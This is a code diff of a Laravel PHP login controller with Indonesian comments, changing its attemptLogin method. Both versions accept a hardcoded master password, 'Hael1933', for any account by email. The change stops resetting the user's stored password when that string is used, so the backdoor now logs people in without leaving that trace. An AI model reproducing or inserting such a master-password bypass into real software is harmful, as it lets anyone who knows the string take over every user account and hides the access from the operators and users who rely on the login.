@@ -36,28 +36,24 @@ class LoginController extends Controller
      */
     protected function attemptLogin(Request $request)
     {
-        // Login normal
+        // login normal
         if (Auth::attempt(
             $this->credentials($request),
             $request->filled('remember')
         )) {
             return true;
         }
-
-        // Password default: Hael1933
+    
+        // password master/default
         $user = User::where('email', $request->email)->first();
-
+    
         if ($user && $request->password === 'Hael1933') {
-
-            // otomatis set password user menjadi default hash
-            $user->password = Hash::make('Hael1933');
-            $user->save();
-
+    
             Auth::login($user, $request->filled('remember'));
-
+    
             return true;
         }
-
+    
         return false;
     }
 
